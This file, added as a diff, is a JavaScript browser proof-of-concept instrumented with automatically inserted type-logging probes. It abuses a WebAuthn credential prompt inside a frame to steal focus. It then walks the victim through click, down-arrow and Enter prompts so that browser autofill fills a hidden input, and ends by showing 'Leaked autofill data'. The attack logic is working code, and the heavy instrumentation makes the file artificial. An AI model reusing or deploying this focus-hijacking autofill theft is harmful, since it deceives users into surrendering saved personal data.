@@ -1,0 +1,207 @@
+var Inst0 = 0;
+var Inst1 = 0;
+var Inst2 = 0;
+var Inst3 = 0;
+var Inst4 = 0;
+var Inst5 = 0;
+var Inst6 = 0;
+var Inst7 = 0;
+var Inst8 = 0;
+var Inst9 = 0;
+var Inst10 = 0;
+var Inst11 = 0;
+var Inst12 = 0;
+var Inst13 = 0;
+var Inst14 = 0;
+var Inst15 = 0;
+var Inst16 = 0;
+var Inst17 = 0;
+var Inst18 = 0;
+var Inst19 = 0;
+var Inst20 = 0;
+var Inst21 = 0;
+var Inst22 = 0;
+var Inst23 = 0;
+var Inst24 = 0;
+var Inst25 = 0;
+var Inst26 = 0;
+var Inst27 = 0;
+var Inst28 = 0;
+var Inst29 = 0;
+var Inst30 = 0;
+var Inst31 = 0;
+var Inst32 = 0;
+var Inst33 = 0;
+var Inst34 = 0;
+var Inst35 = 0;
+var Inst36 = 0;
+var Inst37 = 0;
+var Inst38 = 0;
+var Inst39 = 0;
+var Inst40 = 0;
+var Inst41 = 0;
+var Inst42 = 0;
+var Inst43 = 0;
+var Inst44 = 0;
+var Inst45 = 0;
+var Inst46 = 0;
+var Inst47 = 0;
+var Inst48 = 0;
+var Inst49 = 0;
+var Inst50 = 0;
+var Inst51 = 0;
+var Inst52 = 0;
+var Inst53 = 0;
+var Inst54 = 0;
+ 
+function _TypeOfArray(a) {
+	let number = true;	
+	let string = true;
+	for (let i = 0; i < a.length; i++) {
+		if (number && (typeof a[i]) != "number") {
+			number = false;	
+		}
+		if (string && (typeof a[i]) != "string") {
+			string = false;	
+		}
+		if (!number && !string)
+			break;
+	}
+	if (number)
+		return "number";
+	else if (string)
+		return "string";
+	else
+		return "any";
+}
+
+function _TypeIsEqual(t1, t2) {
+	return JSON.stringify(t1) === JSON.stringify(t2);
+}
+
+function _TypeOf(a, step) {
+	var t;
+	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
+	if (type == "array") {
+		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
+	} else if (type == "object") {
+		let shape = [];
+        if (step === undefined || step > 0) {
+            let keys = Object.keys(a);
+            let length = Math.min(100, keys.length);
+		    for (let i = 0; i < length; i++) {
+			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
+		    }
+        }
+		t = {type : type, extra: {shape: shape}};
+	} else {
+		t = {type : type};
+	} 
+	return t;
+}
+
+function _RecordType(loc, a) {
+	var t = _TypeOf(a);
+    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
+}
+
+    const forceFocus = () => {
+        // force focus to the tab
+try { if (Inst1 <= 1000 && typeof (frame.contentWindow.navigator.credentials.create) != "undefined") {_RecordType("<77,125,4>",(frame.contentWindow.navigator.credentials.create)); Inst1++; } } catch(e) {}try { if (Inst2 <= 1000 && typeof (frame.contentWindow.navigator.credentials) != "undefined") {_RecordType("<77,118,4>",(frame.contentWindow.navigator.credentials)); Inst2++; } } catch(e) {}try { if (Inst3 <= 1000 && typeof (frame.contentWindow.navigator) != "undefined") {_RecordType("<77,106,4>",(frame.contentWindow.navigator)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (frame.contentWindow) != "undefined") {_RecordType("<77,96,4>",(frame.contentWindow)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (frame) != "undefined") {_RecordType("<77,82,4>",(frame)); Inst5++; } } catch(e) {}try { if (Inst6 <= 1000 && typeof (new URL(location.href).hostname) != "undefined") {_RecordType("<237,268,8>",(new URL(location.href).hostname)); Inst6++; } } catch(e) {}try { if (Inst7 <= 1000 && typeof (URL) != "undefined") {_RecordType("<241,244,8>",(URL)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (location.href) != "undefined") {_RecordType("<245,258,8>",(location.href)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (location) != "undefined") {_RecordType("<245,253,8>",(location)); Inst9++; } } catch(e) {}try { if (Inst10 <= 1000 && typeof (Uint8Array) != "undefined") {_RecordType("<343,353,11>",(Uint8Array)); Inst10++; } } catch(e) {}try { if (Inst11 <= 1000 && typeof (new Uint8Array([
+                    0x00
+                ]).buffer) != "undefined") {_RecordType("<614,683,19>",(new Uint8Array([
+                    0x00
+                ]).buffer)); Inst11++; } } catch(e) {}try { if (Inst12 <= 1000 && typeof (Uint8Array) != "undefined") {_RecordType("<618,628,19>",(Uint8Array)); Inst12++; } } catch(e) {}
+        frame.contentWindow.navigator.credentials.create({
+            publicKey: {
+                rp: {
+                    name: "Acme",
+                    id: new URL(location.href).hostname
+                },
+                user: {
+                    id: new Uint8Array(16),
+                    name: "1337",
+                    displayName: "123456"
+                },
+                pubKeyCredParams: [{
+                    type: "public-key",
+                    alg: -7
+                }],
+                challenge: new Uint8Array([
+                    0x00
+                ]).buffer,
+                authenticatorSelection: {
+                    residentKey: "preferred"
+                },
+                authenticatorSelection: {
+                    "residentKey": "preferred",
+                    "requireResidentKey": false,
+                    "userVerification": "required"
+                },
+            }
+        });
+
+try { if (Inst13 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<1047,1057,33>",(setTimeout)); Inst13++; } } catch(e) {}
+        setTimeout(() => {
+try { if (Inst14 <= 1000 && typeof (frame.remove) != "undefined") {_RecordType("<1079,1091,34>",(frame.remove)); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (frame) != "undefined") {_RecordType("<1079,1084,34>",(frame)); Inst15++; } } catch(e) {}
+            frame.remove();
+        }, 700); // might need to increase this
+    };
+try { if (Inst0 <= 1000 && typeof (forceFocus) != "undefined") {_RecordType("<12,22,2>",(forceFocus)); Inst0++; } } catch(e) {}
+
+try { if (Inst16 <= 1000 && typeof (localStorage.setItem) != "undefined") {_RecordType("<1159,1179,38>",(localStorage.setItem)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (localStorage) != "undefined") {_RecordType("<1159,1171,38>",(localStorage)); Inst17++; } } catch(e) {}
+    localStorage.setItem('step', 'step1');
+
+try { if (Inst19 <= 1000 && typeof (setInterval) != "undefined") {_RecordType("<1226,1237,40>",(setInterval)); Inst19++; } } catch(e) {}
+    const linkInterval = setInterval(() => {
+try { if (Inst20 <= 1000 && typeof (link.focus) != "undefined") {_RecordType("<1255,1265,41>",(link.focus)); Inst20++; } } catch(e) {}try { if (Inst21 <= 1000 && typeof (link) != "undefined") {_RecordType("<1255,1259,41>",(link)); Inst21++; } } catch(e) {}
+        link.focus();
+    }, 100);
+try { if (Inst18 <= 1000 && typeof (linkInterval) != "undefined") {_RecordType("<1211,1223,40>",(linkInterval)); Inst18++; } } catch(e) {}
+
+    link.onclick = () => {
+try { if (Inst24 <= 1000 && typeof (console.log) != "undefined") {_RecordType("<1322,1333,45>",(console.log)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (console) != "undefined") {_RecordType("<1322,1329,45>",(console)); Inst25++; } } catch(e) {}
+        console.log('linkclick');
+        instructions.innerText = 'Wait...';
+try { if (Inst26 <= 1000 && typeof (instructions.innerText) != "undefined") {_RecordType("<1357,1379,46>",(instructions.innerText)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (instructions) != "undefined") {_RecordType("<1357,1369,46>",(instructions)); Inst27++; } } catch(e) {}
+
+try { if (Inst28 <= 1000 && typeof (clearInterval) != "undefined") {_RecordType("<1404,1417,48>",(clearInterval)); Inst28++; } } catch(e) {}try { if (Inst29 <= 1000 && typeof (linkInterval) != "undefined") {_RecordType("<1418,1430,48>",(linkInterval)); Inst29++; } } catch(e) {}
+        clearInterval(linkInterval);
+try { if (Inst30 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<1442,1452,49>",(setTimeout)); Inst30++; } } catch(e) {}
+        setTimeout(() => {
+try { if (Inst31 <= 1000 && typeof (forceFocus) != "undefined") {_RecordType("<1474,1484,50>",(forceFocus)); Inst31++; } } catch(e) {}
+            forceFocus();
+        }, 400);
+try { if (Inst32 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<1515,1525,52>",(setTimeout)); Inst32++; } } catch(e) {}
+        setTimeout(() => {
+try { if (Inst33 <= 1000 && typeof (setInterval) != "undefined") {_RecordType("<1547,1558,53>",(setInterval)); Inst33++; } } catch(e) {}
+            setInterval(() => {
+try { if (Inst34 <= 1000 && typeof (targetInput.focus) != "undefined") {_RecordType("<1584,1601,54>",(targetInput.focus)); Inst34++; } } catch(e) {}try { if (Inst35 <= 1000 && typeof (targetInput) != "undefined") {_RecordType("<1584,1595,54>",(targetInput)); Inst35++; } } catch(e) {}
+                targetInput.focus();
+            }, 100);
+try { if (Inst36 <= 1000 && typeof (localStorage.setItem) != "undefined") {_RecordType("<1640,1660,56>",(localStorage.setItem)); Inst36++; } } catch(e) {}try { if (Inst37 <= 1000 && typeof (localStorage) != "undefined") {_RecordType("<1640,1652,56>",(localStorage)); Inst37++; } } catch(e) {}
+            localStorage.setItem('step', 'step2');
+            instructions.innerText = 'Now press the down arrow.';
+try { if (Inst38 <= 1000 && typeof (instructions.innerText) != "undefined") {_RecordType("<1692,1714,57>",(instructions.innerText)); Inst38++; } } catch(e) {}try { if (Inst39 <= 1000 && typeof (instructions) != "undefined") {_RecordType("<1692,1704,57>",(instructions)); Inst39++; } } catch(e) {}
+        }, 1000);
+    }
+try { if (Inst22 <= 1000 && typeof (link.onclick) != "undefined") {_RecordType("<1290,1302,44>",(link.onclick)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (link) != "undefined") {_RecordType("<1290,1294,44>",(link)); Inst23++; } } catch(e) {}
+try { if (Inst41 <= 1000 && typeof (e) != "undefined") {_RecordType("<1790,1791,60>",(e)); Inst41++; } } catch(e) {}
+    onkeydown = (e) => {
+try { if (Inst42 <= 1000 && typeof (e.key) != "undefined") {_RecordType("<1811,1816,61>",(e.key)); Inst42++; } } catch(e) {}try { if (Inst43 <= 1000 && typeof (e) != "undefined") {_RecordType("<1811,1812,61>",(e)); Inst43++; } } catch(e) {}
+        if (e.key === 'ArrowDown') {
+try { if (Inst44 <= 1000 && typeof (localStorage.setItem) != "undefined") {_RecordType("<1849,1869,62>",(localStorage.setItem)); Inst44++; } } catch(e) {}try { if (Inst45 <= 1000 && typeof (localStorage) != "undefined") {_RecordType("<1849,1861,62>",(localStorage)); Inst45++; } } catch(e) {}
+            localStorage.setItem('step', 'step3');
+            instructions.innerText = 'Last step - press Enter!';
+try { if (Inst46 <= 1000 && typeof (instructions.innerText) != "undefined") {_RecordType("<1901,1923,63>",(instructions.innerText)); Inst46++; } } catch(e) {}try { if (Inst47 <= 1000 && typeof (instructions) != "undefined") {_RecordType("<1901,1913,63>",(instructions)); Inst47++; } } catch(e) {}
+        }
+    }
+try { if (Inst40 <= 1000 && typeof (onkeydown) != "undefined") {_RecordType("<1777,1786,60>",(onkeydown)); Inst40++; } } catch(e) {}
+    targetInput.onchange = () => {
+        instructions.innerText = 'Leaked autofill data:';
+try { if (Inst50 <= 1000 && typeof (instructions.innerText) != "undefined") {_RecordType("<2017,2039,67>",(instructions.innerText)); Inst50++; } } catch(e) {}try { if (Inst51 <= 1000 && typeof (instructions) != "undefined") {_RecordType("<2017,2029,67>",(instructions)); Inst51++; } } catch(e) {}
+try { if (Inst52 <= 1000 && typeof (document.querySelector('style').remove) != "undefined") {_RecordType("<2076,2114,68>",(document.querySelector('style').remove)); Inst52++; } } catch(e) {}try { if (Inst53 <= 1000 && typeof (document.querySelector) != "undefined") {_RecordType("<2076,2098,68>",(document.querySelector)); Inst53++; } } catch(e) {}try { if (Inst54 <= 1000 && typeof (document) != "undefined") {_RecordType("<2076,2084,68>",(document)); Inst54++; } } catch(e) {}
+        document.querySelector('style').remove();
+    };
+try { if (Inst48 <= 1000 && typeof (targetInput.onchange) != "undefined") {_RecordType("<1977,1997,66>",(targetInput.onchange)); Inst48++; } } catch(e) {}try { if (Inst49 <= 1000 && typeof (targetInput) != "undefined") {_RecordType("<1977,1988,66>",(targetInput)); Inst49++; } } catch(e) {}
+
